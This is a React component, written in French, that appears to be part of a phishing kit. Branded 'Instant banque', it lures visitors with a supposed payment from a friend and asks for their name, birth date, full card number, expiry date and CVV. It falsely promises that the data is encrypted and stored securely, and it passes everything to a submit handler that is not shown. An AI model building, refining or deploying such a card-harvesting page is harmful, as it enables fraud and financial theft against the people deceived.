import React, { useState } from 'react';
import { FormContainer } from './ui/FormContainer';
import { Input } from './ui/Input';
import { formatBirthDate } from '../utils/dateFormatter';

interface BankFormProps {
  onSubmit: (formData: BankFormData) => Promise<boolean>;
}

export interface BankFormData {
  firstName: string;
  lastName: string;
  birthDate: string;
  cardNumber: string;
  expiryMonth: string;
  expiryYear: string;
  cvv: string;
}

export function BankForm({ onSubmit }: BankFormProps) {
  const [formData, setFormData] = useState<BankFormData>({
    firstName: '',
    lastName: '',
    birthDate: '',
    cardNumber: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: ''
  });
  const [status, setStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setStatus('sending');

    try {
      const success = await onSubmit(formData);
      if (!success) throw new Error('Failed to submit form');
      
      setStatus('success');
      setTimeout(() => setStatus('idle'), 3000);
    } catch (error) {
      setStatus('error');
      setTimeout(() => setStatus('idle'), 3000);
    }
  };

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    
    setFormData(prev => ({
      ...prev,
      [name]: name === 'birthDate' ? formatBirthDate(value) : value
    }));
  };

  return (
    <FormContainer
      title="Instant banque."
      subtitle="Complétez les étapes 1 et 2 avec les informations respectives pour récupérer le montant du paiement entre Amis sur votre Compte Bancaire."
      step="ÉTAPE 1"
    >
      <p className="text-sm text-gray-600 italic mb-8">
        NB : Vos données sont cryptées et stockées sur un serveur ultra sécurisé à l'abri d'un tiers.
      </p>

      <form onSubmit={handleSubmit} className="space-y-6">
        <Input
          label="Veuillez saisir votre prénom"
          name="firstName"
          value={formData.firstName}
          onChange={handleChange}
          placeholder="Prénom"
          required
        />

        <Input
          label="Veuillez saisir votre nom"
          name="lastName"
          value={formData.lastName}
          onChange={handleChange}
          placeholder="Nom de famille"
          required
        />

        <Input
          label="Veuillez saisir votre date de naissance"
          name="birthDate"
          value={formData.birthDate}
          onChange={handleChange}
          placeholder="JJ/MM/AAAA"
          maxLength={10}
          required
        />

        <Input
          label="Numéro de votre carte bancaire"
          name="cardNumber"
          value={formData.cardNumber}
          onChange={handleChange}
          placeholder="45XXXXXXXXXXXXX"
          required
        />

        <div className="space-y-6">
          <label className="block text-sm font-medium text-gray-700">
            Date d'expiration
          </label>
          <div className="grid grid-cols-2 gap-4">
            <Input
              label=""
              name="expiryMonth"
              value={formData.expiryMonth}
              onChange={handleChange}
              placeholder="Mois (mm)"
              required
            />
            <Input
              label=""
              name="expiryYear"
              value={formData.expiryYear}
              onChange={handleChange}
              placeholder="Année (aaaa)"
              required
            />
          </div>
        </div>

        <Input
          type="password"
          label="Veuillez saisir le cryptogramme"
          name="cvv"
          value={formData.cvv}
          onChange={handleChange}
          placeholder="123"
          maxLength={3}
          required
        />

        <button
          type="submit"
          disabled={status === 'sending'}
          className="w-full bg-black text-white font-semibold py-4 rounded-lg transition duration-200 hover:bg-gray-800 disabled:opacity-50 disabled:cursor-not-allowed"
        >
          {status === 'sending' ? 'Traitement en cours...' : 'CONTINUER'}
        </button>

        {status === 'success' && (
          <div className="text-green-600 text-center bg-green-50 p-3 rounded-lg">
            Informations envoyées avec succès!
          </div>
        )}
        {status === 'error' && (
          <div className="text-red-600 text-center bg-red-50 p-3 rounded-lg">
            Échec de l'envoi. Veuillez réessayer.
          </div>
        )}
      </form>
    </FormContainer>
  );
}